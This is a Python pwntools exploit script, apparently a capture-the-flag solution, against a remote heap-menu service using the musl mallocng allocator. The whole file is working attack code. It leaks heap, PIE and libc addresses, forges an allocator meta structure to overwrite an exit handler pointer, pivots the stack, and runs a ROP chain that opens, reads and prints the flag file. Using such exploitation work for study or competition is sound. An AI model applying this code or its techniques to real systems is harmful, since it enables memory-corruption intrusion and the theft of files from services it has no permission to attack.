from pwn import *
import string
import fuckpy3
#p = process('chroot . ./main'.split(' '))
#p = remote('1.13.184.215',23333)
p = remote('43.155.75.222',23333)
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['gnome-terminal', '--']
    # gdb.attach(proc.pidof(p))
    print("gnome-terminal -- gdb attach " + str(proc.pidof(p)[0]))
    os.system("gnome-terminal -- gdb -q ./main " + str(proc.pidof(p)[0]))
    input()


class Meta:
    def __init__(self) -> None:
        self.prev = 0
        self.next = 0
        self.group = 0
        self.avail_mask = 0
        self.free_mask = 0
        self.last_idx = 7
        self.freeable = 1
        self.sizeclass = 0
        self.maplen = 0
    def raw(self):
        tmp1 = self.last_idx & (int('11111',2))
        tmp1 |= (self.freeable<<5)
        tmp1 |= (self.sizeclass << 6)
        tmp1 |= (self.maplen << 12)
        tmp1 &=0xffffffffffffffff 
        return p64(self.prev) + p64(self.next) +\
        p64(self.group) + \
        p32(self.avail_mask) + p32(self.free_mask) + \
        p64(tmp1) + p64(0)

def add(s,i,c = 'a'):
    p.sendafter(':',"1")
    p.send(p32(s))
    p.send(p8(i))
    if s > 0x1000 : return
    p.send(c)

def edit(i,c):
    p.sendafter(':',"3")
    p.send(p8(i))
    p.send(c)

def setidx(i):
    p.sendafter(':',"2")
    p.send(p8(i))

def show(i):
    p.sendafter(':',"4")
    p.send(p8(i))
    p.recvuntil('use ')
    return p.recvuntil(' to attack the boss',drop=True)


#prepare for pie address
for i in range(0x10 + 6):
    add(0x10,0)

# alloca next group
for i in range(7):
    add(0x10,1)

add(0x10000,0)
p.recvuntil('no more magic')
edit(0,'a' * (288-1))
leak1 = show(0)
leak_heap = u64(leak1[:6] + b'\x00'*2) - 144
log.info('leak heap ' + hex(leak_heap))

log.info('start leak')
context.log_level = 'info'
# start leak pie
add(0x100 * 0x1000,1)
for offset in range(0x100,0x2000):
    setidx(1)
    add((offset+1) * 0x1000,1)
    p.recvuntil('no more magic')
    edit(1,'\x00')
    if offset%0x100 == 0: print('.')
    if len(p.recvuntil('failed',timeout = 0.5)) == 0:
        break
context.log_level = 'debug'
log.info('get offset ' + hex(offset)) 
leak_pie = leak_heap - 0x1000 * offset
log.info('leak pie ' + hex(leak_pie)) 
chunk_addr = 3440 + leak_pie
add(0x1000,1)

meta_addr = 520 + leak_heap
add(meta_addr - chunk_addr + 1,0)
setidx(0)
leak1 = show(0)
leak_libc = u64(b'\x00' + leak1[:5] + b'\x00'*2) + 0x4000
log.info('leak libc ' + hex(leak_libc)) 
malloc_req = 0xB6F84 + leak_libc
stack_povit = 0x000000000007b1f5 + leak_libc # 0x000000000007b1f5: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];
rop_addr = leak_libc - 10912
rebase_0 = lambda x : p64(x + leak_libc)

ropchain = rebase_0(0x00000000000152a1) # 0x00000000000152a1: pop rdi; ret;
ropchain += p64(rop_addr)
ropchain += rebase_0(0x000000000001dad9) # 0x000000000001dad9: pop rsi; ret;
ropchain += p64(0)
ropchain += rebase_0(0x0000000000016a96) # 0x0000000000016a96: pop rax; ret;
ropchain += p64(2)
ropchain += rebase_0(0x00000000000238f0) # 0x00000000000238f0: syscall; ret;
ropchain += rebase_0(0x000000000002cdae) # 0x000000000002cdae: pop rdx; ret;
ropchain += p64(0x100)
ropchain += rebase_0(0x00000000000152a1) # 0x00000000000152a1: pop rdi; ret;
ropchain += p64(3)
ropchain += rebase_0(0x000000000001dad9) # 0x000000000001dad9: pop rsi; ret;
ropchain += p64(rop_addr - 0x100)
ropchain += rebase_0(0x0000000000016a96) # 0x0000000000016a96: pop rax; ret;
ropchain += p64(0)
ropchain += rebase_0(0x00000000000238f0) # 0x00000000000238f0: syscall; ret;
ropchain += rebase_0(0x00000000000152a1) # 0x00000000000152a1: pop rdi; ret;
ropchain += p64(1)
ropchain += rebase_0(0x000000000001dad9) # 0x000000000001dad9: pop rsi; ret;
ropchain += p64(rop_addr - 0x100)
ropchain += rebase_0(0x0000000000016a96) # 0x0000000000016a96: pop rax; ret;
ropchain += p64(1)
ropchain += rebase_0(0x00000000000238f0) # 0x00000000000238f0: syscall; ret;


payload = b'flag\x00'.ljust(0x30,b'\x00') + p64(rop_addr + 0x40) + ropchain


fake_exit_ptr = len(payload) + rop_addr

fake_exit = p64(stack_povit) * 32
fake_exit +=  p64(rop_addr) * 32

add(0x1000,1,payload + fake_exit)

meta = Meta()
meta.group = malloc_req - 0x10 + 4 
meta.sizeclass = 0
meta.maplen = 1
meta.avail_mask = 11
add(meta_addr - chunk_addr,0)
setidx(0)
add(meta_addr - chunk_addr + 0x100,0)
edit(0,meta.raw()[16:])

add(0x1000,1)

meta.group = leak_libc + 0xB6D48 - 0x20
meta.sizeclass = 0
meta.maplen = 1
meta.avail_mask = 1
add(meta_addr - chunk_addr,0)
setidx(0)
add(meta_addr - chunk_addr + 0x100,0)
edit(0,meta.raw()[16:])
add(0x1000,0,p64(fake_exit_ptr) * (0x21c//8) + p32(0x233) + p32(1))
p.sendafter(":","5")

p.interactive()
